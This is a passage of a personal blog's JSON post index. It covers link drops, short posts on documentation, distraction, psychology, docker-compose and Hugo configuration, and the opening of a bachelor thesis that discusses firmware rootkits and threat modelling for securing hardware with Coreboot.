it stays within my head for years. But what exact command I executed to perform so odd operation for once does not stay in there. I do recall the command, that there was some option and how I got there.\nBut this is just vague and more often I’m not able to find the original sources and can not easily reproduce the command. Yacks…So at this point, I’m fuzzing around with the command and spending much time trying to reproduce it. It often fits, but more often it causes more issues. Besides, it sometimes worth starting again from a fresh position then keep with a belief to working solutions.\nUntraceable origins Just as in the example before, you quite often do not find the resources that did help to solve the initial problem. Link rot is a big problem and even when the source domain is still active, this does not imply that you’re able to find the exact resources again.\nFor instance, I remembered one post on the Hacker News about documentation that I wanted to use here, but I wasn’t able to find it anymore. I think the quintessence was that documentation is a philosophy and I share this view very much. It seems that the quality of search engines to degenerate over time and become helpful, at least I wasn’t able to find the post.\nThis showed once more that it’s important to take the time to document, even when it was just a useful link, this is why I’ve started the link drop. It should be a way to document useful resources over the long term.\nThe things I\u0026rsquo;m going to write about Over the past years, many interesting topics went on that I have worked on. One side project of my is developed in Rust and in getting it running, many subjects had to be deal with. Yet I failed to document them almost completely. What a shame. Another topic would be the work in Security I do. While much is sealed, once in a while there is something possible posting about.\nThis should conclude what I want to document here: Topics, issues and resources I have faced. That might imply thoughts of mine too.\nso far, thanks for reading,\nakendo\nPS: This blog post should be there on Monday, but because I got sick, I just managed to get it posted today. ;(\n","permalink":"https://blog.akendo.eu/post/2020.01.30-about-documentation/","tags":["Documentation"],"title":"About documentation"},{"categories":["Blog"],"contents":"A Happy new year everyone, this is a late one! I have a bit of an announcement to make: There will be more blog posts! I’m going to develop a better habit of writing thoughts and current topics in here.\nThe blog was created initially as a side project, but suffers from a leak of attention. Most posts do not have the quality to be published in my view and as I want everything to be perfect I often do not publish posts at all.\nBut the writing helps to gather thoughts and ideas about a topic and aids in becoming more focused about it and this is what matters more.\nUntil this point writing has been a very vulnerable process of mine. Sharing composed texts with others feels like sharing a part of me. A friend of mine phrased it as the following: The fear of publishing.\nEven now it takes way more time than planed, it should have been a short post and I’m spending more than half an hour on this text…but writing is hard, isn’t it? However, many ideas and thoughts I had about a post could have been an immense help in the past, because it adds the power to talk about.\nWhat\u0026rsquo;s next? So what should be written in here?\nI\u0026rsquo;m going to share some of my internal documentation composed over the last years. It\u0026rsquo;s mostly one or two lines of written text, however, it contributes a lot of value over time. On the other side, I\u0026rsquo;m going to write some more opinions and views I have.\nHow will this look like? There will be a blog post each week, published on every Monday of the week.\nSo far akendo\n","permalink":"https://blog.akendo.eu/post/2020.01.25-more-writing/","tags":["Generic"],"title":"Writing ahead"},{"categories":["Security"],"contents":" grsecurity - The Life of a Bad Security Fix ","permalink":"https://blog.akendo.eu/flash/23.01.2020-linkdrop/","tags":["kernel","fixes"],"title":"23.01.2020 - link drop"},{"categories":["Memory","Reality"],"contents":" Is Anything Real? - YouTube [DE}Gehirn: So könnt ihr versuchen, negative Erlebnisse zu vergessen › ze.tt ","permalink":"https://blog.akendo.eu/flash/22.01.2020-linkdrop/","tags":["Philosophy"],"title":"22.01.2020 - link drop"},{"categories":["Security"],"contents":" I Was Google’s Head of International Relations. Here’s Why I Left. This Week In Security: More WhatsApp, Nextcry, Hover To Crash, And Android Permissions Bypass | Hackaday Archive ","permalink":"https://blog.akendo.eu/flash/08.01.2020-linkdrop/","tags":[],"title":"08.01.2020 - link drop"},{"categories":[],"contents":" Don’t Shave That Yak! | Seth\u0026rsquo;s Blog On Managed Code Performance ","permalink":"https://blog.akendo.eu/flash/02.01.2020-linkdrop/","tags":[],"title":"02.01.2020 - link drop"},{"categories":["general"],"contents":"I wish everyone a merry christmas and a happy new year!\nbest regards, akendo\n","permalink":"https://blog.akendo.eu/post/2019.12.24-merry-christmas/","tags":[],"title":"Merry Christmas 2019"},{"categories":["Psychology"],"contents":"\nToday, I have learned about the idea of concept creep. This is the phenomena when a special concept exists, but the core concept will be extended to fit different matters or to be more generally applicable.\nThe idea was described in the book: \u0026lsquo;The coddling of the American mind\u0026rsquo; by Greg Lukianoff and Jonathan Haidt. An example of this concept creeps is the PTSD (Posttraumatic stress disorder) that was applied to lectures that might include content that one could see offensive(keyword: trigger warnings). The idea is that a topic like slavery might cause people to have ‘flashbacks’ of being treated in a racist way. However, PTSD is real phenomena while the process of hurt feeling does not quite have the same traumatic effect. This is horizontally concept creep.\nWhen a concept is extended to fit more different terms, this is also a concept creep, a horizontally one too. The example was made for emotional abuse. Similar to PTSD, abuse is quite accurate defined. However, over time the term was extended by some people to fit more ambiguous parts of abuses(horizontally again), but also what accounts as abuse in the first place. The burden, what abuse might be was, lowered and became less extreme, that\u0026rsquo;s the vertical concept creep.\nSource: How Americans Became So Sensitive to Harm and the book.\n","permalink":"https://blog.akendo.eu/flash/17.12.2019-what-i-have-learned-today/","tags":["todayilearned","Messy"],"title":"What I have Learned"},{"categories":["Psychology"],"contents":"\nToday, I have learned about the idea of concept creep. This is the phenomena when a special concept exists, but the core concept will be extended to fit different matters or to be more generally applicable.\nThe idea was described in the book: \u0026lsquo;The coddling of the American mind\u0026rsquo; by Greg Lukianoff and Jonathan Haidt. An example of this concept creeps is the PTSD (Posttraumatic stress disorder) that was applied to lectures that might include content that one could see offensive(keyword: trigger warnings). The idea is that a topic like slavery might cause people to have ‘flashbacks’ of being treated in a racist way. However, PTSD is real phenomena while the process of hurt feeling does not quite have the same traumatic effect. This is horizontally concept creep.\nWhen a concept is extended to fit more different terms, this is also a concept creep, a horizontally one too. The example was made for emotional abuse. Similar to PTSD, abuse is quite accurate defined. However, over time the term was extended by some people to fit more ambiguous parts of abuses(horizontally again), but also what accounts as abuse in the first place. The burden, what abuse might be was, lowered and became less extreme, that\u0026rsquo;s the vertical concept creep.\nSource: How Americans Became So Sensitive to Harm and the book.\n","permalink":"https://blog.akendo.eu/whathaveilearned/17.12.2019-what-i-have-learned-today/","tags":["todayilearned","Messy"],"title":"What I have Learned"},{"categories":[],"contents":" Does e-money make you spend more? - BBC Future ","permalink":"https://blog.akendo.eu/flash/16.12.2019-linkdrop/","tags":[],"title":"16.12.2019 - link drop"},{"categories":[],"contents":" The struggles of an open source maintainer - ","permalink":"https://blog.akendo.eu/flash/11.12.2019-linkdrop/","tags":[],"title":"11.12.2019 - link drop"},{"categories":[],"contents":" The Lesson to Unlearn The issue the author is pointing out it is something that I learned with 12 or maybe 13. Just simply that notation that grades are numbers that were read out of a table where your points are listed. When you have lots of points the grade will be better.\nBut how are these points being generated? Based on the answer you give within those tests. However, most teachers do not mind really to test you for understanding, but rather for the ability from you to remember things.\nThe implication was that I start to answer the tests out of memory without doing much of any learning or preparation. Even math was that simple because most of the time it was just writing down the example out of the homework. Most of the homework results were discusses in the lesson after. So not much work had to be done here.\nThis was working well. My grades weren\u0026rsquo;t high, but it didn\u0026rsquo;t matter for me or anyone else anyway. When it becomes obvious that grades are not a measurement of your intellect, it has a great effect on you. When you attend school for such a stupid thing, why is attendance necessary at all? This gave the school a sense of being pointless.\n","permalink":"https://blog.akendo.eu/flash/09.12.2019-linkdrop/","tags":[],"title":"09.12.2019 - link drop"},{"categories":[],"contents":" DEF CON 27 Conference - Bill Swearingen - HAKC THE POLICE - YouTube ","permalink":"https://blog.akendo.eu/flash/05.12.2019-linkdrop/","tags":[],"title":"05.12.2019 - link drop"},{"categories":["Security"],"contents":" DEF CON 27 Conference - Nina Kollars - Confessions of an Nespresso Money Mule - YouTube DEF CON 27 Conference - Bill Graydon - Duplicating Restricted Mechanical Keys - YouTube ","permalink":"https://blog.akendo.eu/flash/03.12.2019-linkdrop/","tags":["coffee","DEFCON","keys"],"title":"03.12.2019 - link drop"},{"categories":[],"contents":"\nToday, I have learned that when you drink coffee, that the coffin will the effect of blocking the receptors in the brain, responsible to carry Adenosine. However, the coffin does not have the property and will just block the receptors in the brain. Because the brain needs to process the Adenosine it will add additional receptors to process them. This leads to the consequence that the coffin becomes more ineffective, hence, we drink more of it.\nAdenosine is a side-effect of our cells in the nerve system. It prevents over-use and will slow down the nerve cell.\n","permalink":"https://blog.akendo.eu/flash/19.11.2019-what-i-have-learned-today/","tags":["todayilearned","Coffee"],"title":"What I Have Learned"},{"categories":[],"contents":"\nToday, I have learned that when you drink coffee, that the coffin will the effect of blocking the receptors in the brain, responsible to carry Adenosine. However, the coffin does not have the property and will just block the receptors in the brain. Because the brain needs to process the Adenosine it will add additional receptors to process them. This leads to the consequence that the coffin becomes more ineffective, hence, we drink more of it.\nAdenosine is a side-effect of our cells in the nerve system. It prevents over-use and will slow down the nerve cell.\n","permalink":"https://blog.akendo.eu/whathaveilearned/19.11.2019-what-i-have-learned-today/","tags":["todayilearned","Coffee"],"title":"What I Have Learned"},{"categories":["Security"],"contents":" BlueHat Seattle 2019 || Keynote, Alex Stamos - YouTube ","permalink":"https://blog.akendo.eu/flash/02.11.2019-linkdrop/","tags":[],"title":"02.11.2019 - link drop"},{"categories":[],"contents":"","permalink":"https://blog.akendo.eu/flash/30.10.2019-what-i-have-learned-today/","tags":[],"title":"30.10"},{"categories":["Docker"],"contents":"In docker-compose files you can have different keywords to indicate run time dependency. depends_on and links. The latter one is for handling network connection.\nThe links keyword is needed to handles how traffic is directed into one direction. depends_on and links can interfere with one another in terms of dependency. An error like this occurs when you want to run docker-compose up\nDocker compose ERROR: Circular dependency between .... It is an issue when depends_on and links disallowing the docker-compose to start the service because different resources require a service to be running.\nThe general solution for this problem is to disabled the links keywords and get the different services running first. In my understanding the depends_on is for the run time dependency. In sense what a service requires before it can be started:\nA -\u0026gt; B -\u0026gt; C In the sense: A requires B and therefor. But for the links it\u0026rsquo;s the other way around. Who needs a connects to whom\nC -\u0026gt; B -\u0026gt; A best regards, akendo\n","permalink":"https://blog.akendo.eu/post/2019.10.28-docker-compose-circular-dependency/","tags":["dependency"],"title":"docker-compose handling circular dependency"},{"categories":["General"],"contents":"For the first time in ages, my Firefox does not have any open tabs. In fact, my Firefox window is closed currently.\nOver the course of the last years, I accumulated tons of tabs in my web-browsers. Once in a while, another window was open to restarting the tab collection once more. All types of websites about Ideas, article or news that I wanted to read or had some kind of To-do that should follow.\nYet this behaviour focused my attention away from things that I wanted to do. Things that are more meaningful to me. However, packing oneself with distracting content is a common pattern many are affect of. Let’s be honest about this, after a day of work who does not want to feel nice and cosy. Sitting down on the Laptop, opening up YouTube and checking out some funny video is way more enjoyable then composing a blog article.\nThe issue becomes evident with the time, once the evening has past and you’ve started to watch the same jokes videos from ten years ago do you feel better? The answer might be for a short period, however, in many cases you don’t.\nSo I’ve decided to stop reading news, Twitter, Hacker News, stop watching nonsense on YouTube and what’s on my input feed. Articles I was able to read off my tabs and windows were placed into my flash posts. Articles that require additional time and attention are moved onto my List to Read and Watch. Therefore some of them going to show into my list of flash posts soon.\nBut already now, I can see how more and more time is freeing up from the constant stream of distractions. For example: The git repository of this blog was finally clean up, allowing it to be build everywhere. I’m working on a small CI to be able to create posts on my phone. Clean up the repository was a task for more than one year. Also, I was able to fix the cabling of my solar panel. So hell Yeaahr!\nbest regards, akendo\n","permalink":"https://blog.akendo.eu/post/2019.10.27-dealing-with-distraction/","tags":["distractions"],"title":"Dealing with distraction"},{"categories":["Psychology","Security"],"contents":" Baby Talk: Decoding The Secret Language Of Babies Episode 30| Talking Infosec to Non-Infosec Folks - F-Secure Blog What happens when a city bans cars from its streets? - BBC Future DNS Security: Threat Modeling DNSSEC, DoT, and DoH Minerva Elided Branches: Building and Motivating Engineering Teams ","permalink":"https://blog.akendo.eu/flash/24.10.2019-linkdrop/","tags":["podcast","DoT","DoH"],"title":"24.10.2019 - link drop"},{"categories":["Psychology","A.I"],"contents":" Pardon the Interruptions Guys, We Have A Problem: How American Masculinity Creates Lonely Men The problem with metrics is a big problem for AI · fast.ai ","permalink":"https://blog.akendo.eu/flash/22.10.2019-linkdrop/","tags":["attention","podcast","lonelless"],"title":"22.10.2019 - link drop"},{"categories":["Security"],"contents":" How to Share Wi-Fi Adapters Across a Network with Airserv-Ng « Null Byte :: WonderHowTo ","permalink":"https://blog.akendo.eu/flash/15.10.2019-linkdrop/","tags":["Wifi","Airserv"],"title":"15.10.2019 - link drop"},{"categories":["Psychology"],"contents":"\nToday, I have learned that emotion can not be detected reliable.\nThe classical view of since about emotion are, that emotion are clearly distinguishable. Just like a fingerprint we could sort a given emotion to a fitting expression. However, it\u0026rsquo;s not possible to reliable detect emotion based on faces expression.\nInstead emotion are learned though the ages. This is the theory of constructed emotions.\n","permalink":"https://blog.akendo.eu/flash/14.10.2019-what-i-have-learned-today/","tags":["todayilearned","emotion"],"title":"What I have learned"},{"categories":["Psychology"],"contents":"\nToday, I have learned that emotion can not be detected reliable.\nThe classical view of since about emotion are, that emotion are clearly distinguishable. Just like a fingerprint we could sort a given emotion to a fitting expression. However, it\u0026rsquo;s not possible to reliable detect emotion based on faces expression.\nInstead emotion are learned though the ages. This is the theory of constructed emotions.\n","permalink":"https://blog.akendo.eu/whathaveilearned/14.10.2019-what-i-have-learned-today/","tags":["todayilearned","emotion"],"title":"What I have learned"},{"categories":["Psychology","Security","Python"],"contents":" Psychology: Why boredom is bad\u0026hellip; and good for you - BBC Future How a daily 10-minute exercise could boost your happiness - BBC Future What Happens to Your Body on No Sleep | Outside Online Vom Umgang mit Sicherheitslücken | c\u0026rsquo;t Magazin python - What is the difference between shallow copy, deepcopy and normal assignment operation? - Stack Overflow copy — Shallow and deep copy operations — Python 3.7.5rc1 documentation ","permalink":"https://blog.akendo.eu/flash/14.10.2019-linkdrop/","tags":["Boredom","Happiness","Sleep","History","copy","deepcopy"],"title":"14.10.2019 - link drop"},{"categories":["Psychology"],"contents":"\nToday, I have learned that when you enforce tidiness upon people, their will not be more effective or the opposite they become ineffective.\nCurrently, I read the book: Messy - How To be Creative and Resilient in a Tidy-Minded World, Tim Harford, one remarkable note on workspaces: I\u0026rsquo;ve learned that enforced tidiness in an environment that enforces such rules, people might feel more demotivated.\nSpecify when companies foster a tidy-culture like S5: \u0026ldquo;Sort, Straighen, Shine, Standardize and Sustain\u0026rdquo;, it might lead to a feeling of disempowerment. People have the need for some freedom to be messy, to have a work environment that works well for them.\n","permalink":"https://blog.akendo.eu/flash/11.10.2019-what-i-have-learned-today/","tags":["todayilearned","Messy"],"title":"What I Have Learned"},{"categories":["Psychology"],"contents":"\nToday, I have learned that when you enforce tidiness upon people, their will not be more effective or the opposite they become ineffective.\nCurrently, I read the book: Messy - How To be Creative and Resilient in a Tidy-Minded World, Tim Harford, one remarkable note on workspaces: I\u0026rsquo;ve learned that enforced tidiness in an environment that enforces such rules, people might feel more demotivated.\nSpecify when companies foster a tidy-culture like S5: \u0026ldquo;Sort, Straighen, Shine, Standardize and Sustain\u0026rdquo;, it might lead to a feeling of disempowerment. People have the need for some freedom to be messy, to have a work environment that works well for them.\n","permalink":"https://blog.akendo.eu/whathaveilearned/11.10.2019-what-i-have-learned-today/","tags":["todayilearned","Messy"],"title":"What I Have Learned"},{"categories":["Education","Development"],"contents":" My Childhood Schooling In The Soviet Union Was Better Than My Kids’ In U.S. Public Schools Today Our journey to type checking 4 million lines of Python | Dropbox Tech Blog ","permalink":"https://blog.akendo.eu/flash/29.09.2019-linkdrop/","tags":["School","Python","pymy"],"title":"29.09.2019 - link drop"},{"categories":["Psychology"],"contents":" The Concept of Concept Creep - .Psychology today ","permalink":"https://blog.akendo.eu/flash/25.09.2019-linkdrop/","tags":["Conecpt","creep"],"title":"25.09.2019 - link drop"},{"categories":["Security","Psychology"],"contents":" GitHub - drduh/macOS-Security-and-Privacy-Guide: Guide to securing and improving privacy on macOS OS X Hardening BBC - Future - Why we believe fake news ","permalink":"https://blog.akendo.eu/flash/10.09.2019-linkdrop/","tags":["MacOS"],"title":"10.09.2019 - link drop"},{"categories":[],"contents":" You 2.0: Deep Work ","permalink":"https://blog.akendo.eu/flash/02.09.2019-linkdrop/","tags":[],"title":"02.09.2019 - link drop"},{"categories":["Security"],"contents":" Now You See It\u0026hellip; - TOCTOU Attacks Against BootGuard Ich denkender Körper | Telepolis Breaking Through Another Side: Bypassing Firmware Security Boundaries ","permalink":"https://blog.akendo.eu/flash/01.09.2019-linkdrop/","tags":["TreatModel","Hardware","TPM","Bootguard"],"title":"01.09.2019 - link drop"},{"categories":["Linux"],"contents":"Ramblings from Jessie: For the Love of Pipes\n","permalink":"https://blog.akendo.eu/flash/28.08.2019-linkdrop/","tags":["pipe"],"title":"28.08.2019 - link drop"},{"categories":["Rust"],"contents":" Should small Rust structs be passed by-copy or by-borrow? ","permalink":"https://blog.akendo.eu/flash/26.08.2019-linkdrop/","tags":["performanc"],"title":"26.08.2019 - link drop"},{"categories":["Rust"],"contents":" Abstraction without overhead: traits in Rust | Rust Blog ","permalink":"https://blog.akendo.eu/flash/24.08.2019-linkdrop/","tags":["Abstraction"],"title":"24.08.2019 - link drop"},{"categories":["Psychology","Rust"],"contents":" BBC - Future - Eight ways to curb your procrastination Zero Cost Abstractions ","permalink":"https://blog.akendo.eu/flash/23.08.2019-linkdrop/","tags":["Procrastination","Abstraction"],"title":"23.08.2019 - link drop"},{"categories":["Psychology"],"contents":" BBC - Future - The surprising benefits of being blinded by love ","permalink":"https://blog.akendo.eu/flash/17.08.2019-linkdrop/","tags":["Love"],"title":"17.08.2019 - link drop"},{"categories":["Security"],"contents":" DEF CON 23 - Jose Selvi - Breaking SSL Using Time Synchronisation Attacks NTPsec ","permalink":"https://blog.akendo.eu/flash/15.08.2019-linkdrop/","tags":["NTP","TLS","DEFCON"],"title":"15.08.2019 - link drop"},{"categories":["Security"],"contents":" Talk about unintended consequences: GDPR is an identity thief\u0026rsquo;s dream ticket to Europeans\u0026rsquo; data • The Register ","permalink":"https://blog.akendo.eu/flash/13.08.2019-linkdrop/","tags":["GDPR"],"title":"13.08.2019 - link drop"},{"categories":["Security"],"contents":" Inside the Apple T2 Open Sourcing the Kubernetes Security Audit - Cloud Native Computing Foundation ","permalink":"https://blog.akendo.eu/flash/12.08.2019-linkdrop/","tags":["Apple","SecureBoot","Kubernetes","Audit"],"title":"12.08.2019 - link drop"},{"categories":["Linux","Security","Psychology"],"contents":" The Death of Social Reciprocity in the Era of Digital Distraction - Scientific American Blog Network The Rule Of 2 Chris\u0026rsquo;s Wiki :: blog/unix/NoSwapConsequence You 2.0: Tunnel Vision ","permalink":"https://blog.akendo.eu/flash/09.08.2019-linkdrop/","tags":["Swap","Scarcity"],"title":"09.08.2019 - link drop"},{"categories":[],"contents":" How to pick a random number from 1-10 It’s Time for Some Queueing Theory ","permalink":"https://blog.akendo.eu/flash/27.07.2019-linkdrop/","tags":["Statistics"],"title":"27.07.2019 - link drop"},{"categories":["Blog"],"contents":"Some additional notes about Hugo: I\u0026rsquo;ve changed the pagination of the main page. The pagination was a bit broken, because I want only to show blog article, but not the flash posts. This was done by adding to the file of layouts/index.html to filter out pages.\n\u0026lt;div class=\u0026#34;catalogue\u0026#34;\u0026gt; {{ range (.Paginate .Pages).Pages }} {{ end }} \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;catalogue\u0026#34;\u0026gt; {{ range where (.Paginate .Pages).Pages \u0026#34;Section\u0026#34; \u0026#34;post\u0026#34; }} {{ end }} \u0026lt;/div\u0026gt; The problem is simple: It get\u0026rsquo;s all pages and filter for the section the post originated from. However, most posts from me are a flash post lately. This way the list shrinks down and the first page seems quite short.\nThe solution for this is to change the pagination. Lucky, the hugo documentation provided a fitting example for this:\n\u0026lt;div class=\u0026#34;catalogue\u0026#34;\u0026gt; {{ $paginator := .Paginate (where .Pages \u0026#34;Type\u0026#34; \u0026#34;post\u0026#34;) 10 }} {{ range where (.Paginate .Pages).Pages \u0026#34;Section\u0026#34; \u0026#34;post\u0026#34; }} {{ .Render \u0026#34;summary\u0026#34; }} {{ end }} \u0026lt;/div\u0026gt; Changed summaries While working on this, I also updated the default value for the Automatic Summary Splitting. Hugo will take some lines of each post will display it in the overview. This is what the Summary implies. But most of the time this looked way to much. Instead, I reduced it to 20 down from 70.\nAdded read times Also, I\u0026rsquo;ve updated the header of the blog posts to include the .ReadingTime. This way a reader can see how long a single posts takes to read. This is obviously a estimation, but it makes it more senseful for him if he wants to spend that time on the article or not.\nso far, akendo\n","permalink":"https://blog.akendo.eu/post/2019.07.26-hugo-side-notes/","tags":["Hugo"],"title":"Side notes about Hugo"},{"categories":["Blog"],"contents":"I\u0026rsquo;ve added a search function to the blog. I\u0026rsquo;ve been more often here and did some search of posts of my own. Because I do not like to have google or something else to search for my content I wished to add a search function.\nThe hugo documentation has a page for this matters. It lists various solutions to implement. I took the one without NPM or elastic search. It was implemented by a guy called \u0026rsquo;eddiewebb\u0026rsquo; and does come with a simple: \u0026lsquo;Place this files here\u0026rsquo; solution Basically, during the creation process of the pages with hugo, it will index the content. You add this as a searchable content and than load some additional JavaScript file that will check though the content.\nThe only change I\u0026rsquo;ve had to made was removing within the suggested layouts/_default/search.html the {{ define \u0026quot;footerfiles\u0026quot; }}. This was not loaded with the template that is used here. Instead I\u0026rsquo;ve moved the block further down the page. It will be loaded on the end of the page.\n","permalink":"https://blog.akendo.eu/post/2019.07.26-hugo-search/","tags":["Hugo"],"title":"Search with hugo"},{"categories":["Linux","Security","OpenWRT"],"contents":" Vim anti-patterns | Arabesque Mitigations Against Adversarial Attacks | News from the Lab Trying to deploy WPA3 on my home network ","permalink":"https://blog.akendo.eu/flash/23.07.2019-linkdrop/","tags":["vim","A.I","WPA3","OpenWRT"],"title":"23.07.2019 - link drop"},{"categories":["Development","Security"],"contents":" The Internet Has Made Dupes—and Cynics—of Us All | WIRED Avoid Indirection in Code Understanding Docker container escapes | Trail of Bits Blog ","permalink":"https://blog.akendo.eu/flash/22.07.2019-linkdrop/","tags":["Python","Docker"],"title":"22.07.2019 - link drop"},{"categories":["Psychology","Security","Rust"],"contents":" Why Procrastinators Procrastinate How to Beat Procrastination The Procrastination Matrix Your Pa$$word doesn\u0026rsquo;t matter - Microsoft Tech Community - 731984 XXE at Bol.com - Jonathan Bouman - Medium Benchmarking in Rust — Llogiq on stuff ","permalink":"https://blog.akendo.eu/flash/16.07.2019-linkdrop/","tags":["Procrastination","Passwords","XXE","Benchmarking"],"title":"16.07.2019 - link drop"},{"categories":["Hardware"],"contents":" Ryzen 3000 \u0026amp; Navi Megathread | Level One Techs A better zip bomb ","permalink":"https://blog.akendo.eu/flash/14.07.2019-linkdrop/","tags":["AMD","Security'"],"title":"14.07.2019 - link drop"},{"categories":["Bachelorthesis","Security","Coreboot"],"contents":" This document provides an overview about current state of security in the field of hardware firmware and try to address some of the issues with an open source solution called ’Coreboot’. With this thesis further issues of modern hardware will be explain.\nTable of Contents Securing Hardware with Coreboot Table of Contents Introduction Why do we trust a system? Backdoor-Capabilities in Hardware Modelling a Threat Threat Model Model of a Laptop Enhance of the TM UEFI History BIOS Operating Modes Real Mode Protected Mode Virtual-8086 Mode System Management Mode Long Mode Boot process Boot Loader UEFI Architecture Flaws in UEFI and Secure Boot Secure Boot Revised Threat Mode Conclusion Coreboot History of coreboot Architecture of coreboot CBFS bootblock romstage ramstage payload Possible payloads SeaBIOS Setup Coreboot Issues Build environment Inconsistent Documentation No hardware support Hardware Intel Bootguard x220 External SPI Programmer Exposing the x220 Extraction of the original firmware SPI Chip Partitioning Layout Layout and other Firmware Configuration Installation of coreboot Evaluation Securing the Hardware Trusted Platform Module - TPM Heads Intel Management Engine Game Changer Disarming the ME Function beyond Intent me_cleaner Summary Introduction A laptop is sent in for an audit. It was reported that this particular laptop was exhibiting some \u0026lsquo;odd\u0026rsquo; behavior. \u0026lsquo;Odd behavior?\u0026rsquo; one might think. Just a user who is doing it wrong. Minutes later, an Operating System (OS) with a famous logo has been booted and the investigation begins.\nThe misbehavior is that at any given time on a website an advertisement is displayed. Imagine a blank HTML page with the imprint of \u0026lsquo;Hello World\u0026rsquo; and right beneath it a width banner for whatever sells best in this moment. \u0026lsquo;Odd\u0026rsquo;, one might think. The banner cannot be found in the actual source code. But a solution is at hand: The installation of an Anti-Virus (AV) software.\nOne AV-Scan later, a nasty malware, an abbreviation for malicious software, is found. Software that appends to any given website an advertisement banner. The AV Software suggests to do what it can do best; removing the malware. It seems that the oddness has been taken care of.\nThe computer is left running for another day, as routine dictates. On the next day, the weirdness is about to start over: The malware has returned. Without the Anti-Virus noticing, the malware was re-installed on the Windows laptop. Another AV-Scan tells the same story. Again, the AV Software deletes the malware. Was this maybe a malfunction of the AV Software?\nThe malware is found again. Again a banner for some dirty websites is concatenated into the \u0026lsquo;Hello World\u0026rsquo; page of the web browser. This time, another AV Software is installed. As its predecessor, it unveils the malware and erases its traces from the surface of the hard disk. Yet only, to be found once more later. One might change to another AV product of the many solutions the market offers, in the hope one of them might deal with it correctly. However, why should anyone trust a compromised system anyway? The auditor decides to do a fresh installation of the Windows laptop.\nSome time later, the laptop has a new installation of Windows, including the newest security patches. The odds are now against the malware, one might think. For another night, the computer keeps running and the malware seems to be gone. But what is this? The next day, the malware returns. Did the malware just re-install itself?\nA conclusion comes to mind: Has some hardware related component been infected? Parts of the computer will be replaced, the hard drive, the Network Interface Card (NIC) until only the motherboard remains. Fortunately, the ROM Chip in which the BIOS, the Basic Input and Output System, lives can be exchanged. The BIOS is responsible to initialize the hardware. A new ROM Chip was purchased over the vendor. The same procedure is conducted once more, re-installation of the OS and another day that passes. This time, no advertisement shows up. For once, no new malware installation is unveiled. It has been defeated!\nWhy do we trust a system? In a plot like chapter one (introduction), we are not confronted with malware, but with a type of software that is named \u0026lsquo;rootkit\u0026rsquo;, or \u0026lsquo;bootkit\u0026rsquo;. A rootkit is a piece of software that acts maliciously and compromises a system in a way that it changes execution flow. Allowing arbitrary code to be executed and changing the behavior of the affected system to the authors biding. While the plot from chapter one was imaginary, one could only imagine how a researcher has found the \u0026lsquo;Mebromi rootkit\u0026rsquo;[5][6] 1.\nWith the rise of computers, they become ubiquitous in our environment. We entrust them everyday with more and more tasks that are crucial for our society as a whole. However, with this degree of importance, how much of the systems we are using can be considered to be trustworthy? In the plot of chapter one, it was an obvious situation.\nOver the last 20 years, computer systems have become so complex that no one can handle their complexity. Software and hardware alike have grown in this intricacy likewise. While software can be reviewed, hardware cannot. Many vendors of hardware[7][8] also do not allow reviews. Systems are sold as black boxes and hardware vendors just implement them to their system. These are many areas in which a rootkit can nest.\nDifferent researches[15][62][96][97] have shown that attacks on firmware components are quite likely. Some time ago, a researcher presented an obnoxious type of rootkit named: \u0026lsquo;badBIOS\u0026rsquo;[9]. A rootkit that is supposed to infect a system using ultrasonic sound. While many experts[10] remain doubtful about it, researchers from the Fraunhofer Institute have shown in their paper: \u0026lsquo;On Covert Acoustical Mesh Networks In Air\u0026rsquo;[11] that using ultrasonic sound is a valid communications channel. The security researcher Robert Graham analyzed the composed feature of the \u0026lsquo;badBIOS\u0026rsquo; and concluded[12] that it is plausible.\nWith the development of a proof of concept (POC) rootkit \u0026lsquo;LightEater\u0026rsquo;[15], Corey Kallenberg and Xeno Kovah demonstrated how plausible rootkits in BIOS[16] are. \u0026lsquo;LightEater\u0026rsquo; allowed the extracting of GPG keys, even when a secure OS like Tails was running.\nBackdoor-Capabilities in Hardware It is possible that a computer with all security patches still might be compromised, with changes[[13][14] deep inside the hardware, beyond detection from any software. This might be possible when it is embedded into the firmware[17][18] or in the hardware itself. Firmware is hardware specific software. The word firmware is composed out of the words \u0026lsquo;firm\u0026rsquo; and \u0026lsquo;software\u0026rsquo;.\nWith the NICSSH[19 page 4], an attack was demonstrated that aims at functions in modern NICs. This attack allows to execute a minimal SSH Server within the NIC. This way, an attacker can access the hardware via the network traffic. He can then snoop all of the network traffic. While the NIC might not hold enough resources for longer traffic dumps, another device can be utilized to bypass this obstacle. Hardware, such as the graphic card, will be used in order to store the network traffic in the memory of the GPU. The CPU is almost entirely uninvolved.\nApart from potential backdoors, Intel itself does provide backdoor type capabilities within its shipped hardware. The \u0026lsquo;Intel Anti-Theft Technology\u0026rsquo;[20] allows to control modern processors remotely, even when the OS is turned off. It might be disabled, but even a corporation like Intel is not always capable of securing their products appropriately.\nOnce hardware itself becomes compromised, it is almost impossible to detect the compromised component. Figure 1.1 shows a hardware Trojan altering the behavior of logic gates that are composed out of CMOS. On the left side of figure 1.1, there is the supposed inverter and on the right side a compromised one. The compromised gate will be placed within critical components, components like a Random Number Generator (RND). This would lead to the result that the RND produces numbers of predictable manner for an attacker.[13 Page 10]\nOther methods to compromise hardware exist: the Hardware Description Language (HDL)[21 page 42], for example, responsible for the designs of specific components. Another option could be the implementation of shadowing components[22] during the development process of hardware.\nAt the end of the day, this comes down to one essential aspect: The costs of time and money. The main question shows the value one tries to protect and how much would it cost to undermine this. In figure 1.2 [23], we need to look for the right spot to address security, else we will not have a reasonable degree of security. But the question that needs to be raised is, what do we want to protect? What is our asset? 2\nModelling a Threat To find flaws, we will need to create a model of the asset we consider worth protecting. To rephrase the situation from chapter one: How could the laptop have been protected? A useful instrument to make sense of risks for an asset is the usage of a Threat Model.\nThreat Model A Threat Model(TM) is an abstract representation of systems to find flaws. Adam Shostack has developed a general approach to TMs at Microsoft:\nEveryone threat models. Many people do it out of frustration in line at the airport, sneaking out of the house or into a bar. At the airport, you might idly consider how to sneak something through security, even if you have no intent to do so. Sneaking in or out of someplace, you worry about who might catch you. When you speed down the highway, you work with an implicit threat model where the main threat is the police, who you probably think are lurking behind a billboard or overpass. Threats of road obstructions, deer, or rain might play into your model as well. When you threat model, you usually use two types of models. There\u0026rsquo;s a model of what you\u0026rsquo;re building, and there\u0026rsquo;s a model of the threats (what can go wrong). [...] (Adam Shostack[3] page 24)\nA TM can thus be summarized as follows: \u0026lsquo;whatever can go wrong\u0026rsquo;. This question is important to any devised system. How does it handle failure, misbehavior or maliciously formatted inputs. Because this is a model, we will illustrate our system in the most simple fashion. In our model, we will take a look at our current system and try to think about potentials threats, aspects that can go wrong. Once we have all 